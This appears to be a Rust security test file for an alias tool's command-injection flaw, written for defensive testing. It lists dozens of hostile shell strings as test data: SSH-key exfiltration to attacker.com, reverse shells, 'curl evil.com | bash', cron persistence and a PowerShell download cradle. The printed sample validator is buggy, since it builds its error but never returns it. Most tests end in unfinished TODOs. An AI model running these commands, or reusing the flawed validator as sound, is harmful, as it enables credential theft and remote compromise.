// ALIAS COMMAND INJECTION SECURITY TESTS
// =======================================
// Comprehensive test suite for alias command injection vulnerabilities
//
// CRITICAL VULNERABILITY: src/core/alias_generator.rs:106-109
// The Unix alias generator writes commands directly to bash scripts without sanitization
//
// This file documents exploit techniques and provides test cases for:
// 1. Shell command injection
// 2. Command substitution attacks
// 3. Background process injection
// 4. Environment manipulation
// 5. Privilege escalation attempts

/// List of dangerous shell metacharacters that should be validated/escaped
const DANGEROUS_SHELL_CHARS: &[char] = &[
    ';',  // Command separator
    '|',  // Pipe
    '&',  // Background/AND
    '$',  // Variable expansion
    '`',  // Command substitution (backticks)
    '(',  // Subshell start
    ')',  // Subshell end
    '<',  // Input redirection
    '>',  // Output redirection
    '\n', // Newline (command separator)
    '\r', // Carriage return
    '\\', // Escape character
];

/// Helper function to check if a command contains dangerous characters
fn contains_dangerous_chars(command: &str) -> bool {
    DANGEROUS_SHELL_CHARS.iter().any(|&c| command.contains(c))
}

#[test]
fn test_command_separator_injection() {
    use msc::core::alias::Alias;

    // Attack: Use ; to execute multiple commands
    let attacks = vec![
        (
            "Credential theft",
            "ls; curl http://attacker.com?data=$(cat ~/.ssh/id_rsa | base64)",
        ),
        ("File deletion", "echo hello; rm -rf /tmp/*"),
        (
            "Malware download",
            "echo safe; curl http://evil.com/malware.sh | bash",
        ),
        (
            "Reverse shell",
            "ls; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        ),
        ("Privilege escalation", "id; sudo -l"),
    ];

    println!("\n╔══════════════════════════════════════════════════════════════════╗");
    println!("║     COMMAND SEPARATOR INJECTION SECURITY TEST                   ║");
    println!("╚══════════════════════════════════════════════════════════════════╝\n");

    for (name, command) in attacks {
        println!("⚠️  Testing Attack: {}", name);
        println!("    Command: {}", command);

        assert!(
            contains_dangerous_chars(command),
            "Should detect dangerous characters in: {}",
            command
        );

        // CRITICAL SECURITY TEST: These commands should be REJECTED
        let result = Alias::new("malicious".to_string(), command.to_string());

        assert!(
            result.is_err(),
            "❌ SECURITY FAILURE: Should reject command injection attack '{}': {}",
            name,
            command
        );

        if let Err(e) = result {
            println!("    ✅ BLOCKED: {}", e);
            // Verify error message mentions security issue
            let error_msg = e.to_string();
            assert!(
                error_msg.contains("dangerous character")
                    || error_msg.contains("not allowed")
                    || error_msg.contains("shell injection"),
                "Error should mention security issue, got: {}",
                error_msg
            );
        }
        println!();
    }

    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║  ✅ ALL COMMAND SEPARATOR INJECTION ATTACKS SUCCESSFULLY BLOCKED ║");
    println!("╚══════════════════════════════════════════════════════════════════╝\n");
}

#[test]
fn test_pipe_operator_injection() {
    // Attack: Use | to pipe output to malicious commands
    let attacks = vec![
        (
            "Password exfiltration",
            "cat /etc/passwd | curl -X POST --data-binary @- http://attacker.com/steal",
        ),
        (
            "Data mining",
            "find ~ -name '*.key' | xargs cat | nc attacker.com 1234",
        ),
        (
            "Process injection",
            "ps aux | grep ssh | awk '{print $2}' | xargs kill -9",
        ),
    ];

    for (name, command) in attacks {
        println!("⚠️  PIPE ATTACK: {} -> {}", name, command);
        assert!(command.contains('|'));
        // TODO: Validate
    }
}

#[test]
fn test_background_process_injection() {
    // Attack: Use & to run malicious processes in background
    let attacks = vec![
        (
            "Backdoor",
            "echo hello & (while true; do nc -l 1234 -e /bin/bash; done) &",
        ),
        ("Keylogger", "ls & python /tmp/keylogger.py &"),
        ("Crypto miner", "pwd & /tmp/xmrig --url pool.miner.com &"),
        (
            "Persistence",
            "date & (crontab -l; echo '* * * * * /tmp/backdoor.sh') | crontab - &",
        ),
    ];

    for (name, command) in attacks {
        println!("⚠️  BACKGROUND ATTACK: {} -> {}", name, command);
        assert!(command.contains('&'));
        // TODO: Validate
    }
}

#[test]
fn test_command_substitution_backticks() {
    // Attack: Use `` to execute commands and embed output
    let attacks = vec![
        ("Hostname exfil", "echo `hostname`"),
        ("User enumeration", "curl http://evil.com/log?user=`whoami`"),
        ("File read", "echo `cat /etc/shadow`"),
        ("Network scan", "ping -c1 `dig +short target.com`"),
    ];

    for (name, command) in attacks {
        println!("⚠️  BACKTICK ATTACK: {} -> {}", name, command);
        assert!(command.contains('`'));
        // TODO: Validate
    }
}

#[test]
fn test_command_substitution_dollar_paren() {
    // Attack: Use $() for command substitution (preferred modern syntax)
    let attacks = vec![
        (
            "Password hash",
            "curl evil.com?hash=$(cat /etc/shadow | head -n1)",
        ),
        (
            "SSH key theft",
            "nc attacker.com 1234 < $(find ~ -name id_rsa)",
        ),
        ("AWS credentials", "echo $(cat ~/.aws/credentials)"),
        ("Process info", "echo $(ps aux | grep root)"),
    ];

    for (name, command) in attacks {
        println!("⚠️  DOLLAR-PAREN ATTACK: {} -> {}", name, command);
        assert!(command.contains("$("));
        // TODO: Validate
    }
}

#[test]
fn test_variable_expansion_attacks() {
    // Attack: Manipulate environment variables
    let attacks = vec![
        ("PATH hijacking", "export PATH=/tmp:$PATH; ls"),
        (
            "LD_PRELOAD injection",
            "export LD_PRELOAD=/tmp/evil.so; any_command",
        ),
        ("HOME manipulation", "export HOME=/tmp/fake_home; cd ~"),
        (
            "Variable exfil",
            "curl evil.com?path=$PATH&user=$USER&home=$HOME",
        ),
    ];

    for (name, command) in attacks {
        println!("⚠️  VARIABLE ATTACK: {} -> {}", name, command);
        // TODO: Validate
    }
}

#[test]
fn test_redirection_attacks() {
    // Attack: Use < > to redirect input/output
    let attacks = vec![
        ("File overwrite", "echo malicious > /etc/cron.d/backdoor"),
        ("Data exfil", "cat ~/.ssh/id_rsa > /tmp/stolen"),
        ("Log manipulation", "echo fake_log >> /var/log/auth.log"),
        ("Binary replacement", "cat /tmp/evil_binary > /usr/bin/sudo"),
    ];

    for (name, command) in attacks {
        println!("⚠️  REDIRECTION ATTACK: {} -> {}", name, command);
        assert!(command.contains('>') || command.contains('<'));
        // TODO: Validate
    }
}

#[test]
fn test_subshell_attacks() {
    // Attack: Use () to create subshells
    let attacks = vec![
        ("Isolated execution", "(cd /tmp && ./malware.sh)"),
        ("Privilege drop bypass", "(sudo su -c 'malicious command')"),
        ("Nested commands", "(curl evil.com/script.sh | bash)"),
    ];

    for (name, command) in attacks {
        println!("⚠️  SUBSHELL ATTACK: {} -> {}", name, command);
        assert!(command.contains('(') || command.contains(')'));
        // TODO: Validate
    }
}

#[test]
fn test_newline_injection() {
    // Attack: Use \n to inject multiple commands
    let attacks = vec![
        (
            "Multi-line exploit",
            "echo hello\ncurl http://evil.com\nrm -rf /",
        ),
        ("Script injection", "pwd\n#!/bin/bash\nmalicious_script"),
    ];

    for (name, command) in attacks {
        println!("⚠️  NEWLINE ATTACK: {} -> {}", name, command);
        assert!(command.contains('\n'));
        // TODO: Validate
    }
}

#[test]
fn test_escape_sequence_attacks() {
    // Attack: Use backslash to escape validation
    let attacks = vec![
        ("Escaped semicolon", "echo hello\\; rm -rf /"),
        ("Escaped backtick", "echo \\`whoami\\`"),
        ("Escaped newline", "echo test\\\nmalicious"),
    ];

    for (name, command) in attacks {
        println!("⚠️  ESCAPE ATTACK: {} -> {}", name, command);
        // TODO: Validate
    }
}

#[test]
fn test_combined_exploitation_chains() {
    // Attack: Combine multiple techniques for maximum impact
    let advanced_attacks = vec![
        (
            "Full system compromise",
            "echo test; curl http://evil.com/rootkit.sh | bash & export PATH=/tmp:$PATH; $(find / -perm -4000 2>/dev/null | head -n1)"
        ),
        (
            "Persistent backdoor",
            "pwd & (while true; do nc -l 1234 -e /bin/bash; sleep 60; done) & echo '* * * * * /tmp/backdoor' | crontab -"
        ),
        (
            "Data exfiltration pipeline",
            "find ~ -type f -name '*.key' -o -name '*.pem' -o -name 'id_rsa*' | xargs tar czf - | curl -X POST --data-binary @- http://attacker.com/steal"
        ),
        (
            "Privilege escalation attempt",
            "sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /etc/sudoers; cat /etc/shadow"
        ),
    ];

    for (name, command) in advanced_attacks {
        println!("\n⚠️  ADVANCED ATTACK CHAIN: {}", name);
        println!("    Command: {}", command);
        println!("    Length: {} characters", command.len());
        println!(
            "    Dangerous chars: {:?}",
            DANGEROUS_SHELL_CHARS
                .iter()
                .filter(|&&c| command.contains(c))
                .collect::<Vec<_>>()
        );

        // TODO: Implement comprehensive validation
    }
}

#[test]
fn test_windows_specific_attacks() {
    // Attack: Windows CMD/PowerShell injection
    let windows_attacks = vec![
        ("CMD injection", "dir & del /F /Q C:\\Windows\\System32\\*"),
        ("PowerShell injection", "notepad & powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""),
        ("Registry manipulation", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\malware.exe"),
        ("Service creation", "sc create malicious binPath= C:\\backdoor.exe & sc start malicious"),
    ];

    for (name, command) in windows_attacks {
        println!("⚠️  WINDOWS ATTACK: {} -> {}", name, command);
        // TODO: Validate Windows commands
    }
}

#[test]
fn test_legitimate_commands_should_pass() {
    use msc::core::alias::Alias;

    // These are legitimate commands that should be ALLOWED
    let safe_commands = vec![
        "ls -la",
        "git status",
        "python3 -m http.server 8000",
        "npm run dev",
        "cargo build --release",
        "docker ps -a",
        "kubectl get pods",
        "echo hello",
        "cat file.txt",
    ];

    println!("\n╔══════════════════════════════════════════════════════════════════╗");
    println!("║           LEGITIMATE COMMANDS VALIDATION TEST                    ║");
    println!("╚══════════════════════════════════════════════════════════════════╝\n");

    for command in safe_commands {
        println!("✅ Testing safe command: {}", command);

        let result = Alias::new("test".to_string(), command.to_string());

        assert!(
            result.is_ok(),
            "❌ Should allow safe command: {}. Error: {:?}",
            command,
            result.err()
        );

        if result.is_ok() {
            println!("    ✓ ALLOWED\n");
        }
    }

    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║      ✅ ALL LEGITIMATE COMMANDS PASSED VALIDATION                ║");
    println!("╚══════════════════════════════════════════════════════════════════╝\n");
}

#[test]
fn test_validation_recommendations() {
    println!("\n═══════════════════════════════════════════════════════");
    println!("          ALIAS COMMAND VALIDATION RECOMMENDATIONS        ");
    println!("═══════════════════════════════════════════════════════\n");

    println!("🔴 CRITICAL: Implement command validation IMMEDIATELY\n");

    println!("Option 1: WHITELIST APPROACH (Most Secure)");
    println!("  ✓ Maintain list of allowed safe commands");
    println!("  ✓ Only permit exact matches or simple arguments");
    println!("  ✓ Reject anything with shell metacharacters");
    println!("  Example: Allow 'git status', 'ls -la', but reject 'ls; rm'");

    println!("Option 2: BLACKLIST DANGEROUS PATTERNS (Moderate)");
    println!("  • Reject commands containing: ; | & $ ` ( ) < > \\ \\n");
    println!("  • Check for command substitution: $() ``");
    println!("  • Validate no path traversal: ../");
    println!("  • Limit command length (e.g., 500 chars)");
    println!("  ⚠️  Warning: Blacklists can be bypassed!");

    println!("Option 3: SHELL ESCAPING (Least Secure)");
    println!("  • Use shellwords or shlex crate to escape");
    println!("  • Quote the entire command properly");
    println!("  • Still vulnerable to complex exploits");
    println!("  ⚠️  Not recommended as primary defense");

    println!("RECOMMENDED IMPLEMENTATION:");
    println!("  1. Validate command against whitelist of safe patterns");
    println!("  2. If not in whitelist, check for dangerous characters");
    println!("  3. Escape the command properly (defense in depth)");
    println!("  4. Log rejected commands for security monitoring");
    println!("  5. Warn user about security implications");

    println!("CODE EXAMPLE:");
    println!(
        r#"
pub fn validate_alias_command(command: &str) -> Result<()> {{
    // 1. Check length
    if command.len() > 500 {{
        return Err(anyhow!("Command too long (max 500 chars)"));
    }}

    // 2. Check for null bytes
    if command.contains('\0') {{
        return Err(anyhow!("Command contains null byte"));
    }}

    // 3. Check for dangerous characters
    let dangerous = [';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r'];
    for ch in dangerous {{
        if command.contains(ch) {{
            Err(anyhow!(
                "Command contains dangerous character '{{}}' - potential shell injection",
                ch
            ));
        }}
    }}

    // 4. Check for command substitution
    if command.contains("$(") || command.contains("`") {{
        return Err(anyhow!("Command substitution not allowed"));
    }}

    // 5. Check for path traversal
    if command.contains("..") {{
        return Err(anyhow!("Path traversal not allowed in commands"));
    }}  

    Ok(())
}}
"#
    );

    println!("═══════════════════════════════════════════════════════\n");
}

#[test]
fn test_real_world_exploit_scenarios() {
    println!("\n═══════════════════════════════════════════════════════");
    println!("            REAL-WORLD EXPLOIT SCENARIOS                ");
    println!("═══════════════════════════════════════════════════════\n");

    println!("SCENARIO 1: Corporate Environment");
    println!("  Attacker: Malicious insider or compromised account");
    println!("  Target: Development workstations");
    println!("  Method:");
    println!("    1. Create alias: msc alias add ll 'ls -la; curl http://attacker.internal/exfil?hostname=$(hostname)&user=$(whoami)'");
    println!("    2. User executes 'll' thinking it's safe");
    println!("    3. Attacker receives hostname and username");
    println!("    4. Escalate to full credential theft");

    println!("SCENARIO 2: Supply Chain Attack");
    println!("  Attacker: Compromised tutorial/documentation");
    println!("  Target: Developers following online guides");
    println!("  Method:");
    println!("    1. Tutorial says: 'Add this useful alias!'");
    println!("    2. msc alias add deploy 'git push origin main; curl http://evil.com/$(cat ~/.ssh/id_rsa|base64)'");
    println!("    3. Developer copies command without inspection");
    println!("    4. SSH keys stolen on next deploy");

    println!("SCENARIO 3: Persistent Backdoor");
    println!("  Attacker: External attacker with initial access");
    println!("  Target: Long-term system compromise");
    println!("  Method:");
    println!("    1. Create alias with background process");
    println!("    2. msc alias add ls 'ls $@ & (nc -l 4444 -e /bin/bash) &'");
    println!("    3. Every 'ls' command spawns hidden backdoor");
    println!("    4. Backdoor persists across sessions");

    println!("SCENARIO 4: Privilege Escalation");
    println!("  Attacker: Low-privilege user");
    println!("  Target: Root/admin access");
    println!("  Method:");
    println!("    1. Find SUID binary or sudo misconfiguration");
    println!("    2. Create alias that exploits it");
    println!("    3. msc alias add update 'sudo apt update; sudo bash'");
    println!("    4. Trick admin into running 'update' alias");

    println!("IMPACT ASSESSMENT:");
    println!("  • Confidentiality: HIGH (credential theft, data exfil)");
    println!("  • Integrity: HIGH (malware installation, backdoors)");
    println!("  • Availability: MEDIUM (could delete files, DoS)");
    println!("  • CVSS Score: ~9.8 (Critical)");

    println!("═══════════════════════════════════════════════════════\n");
}
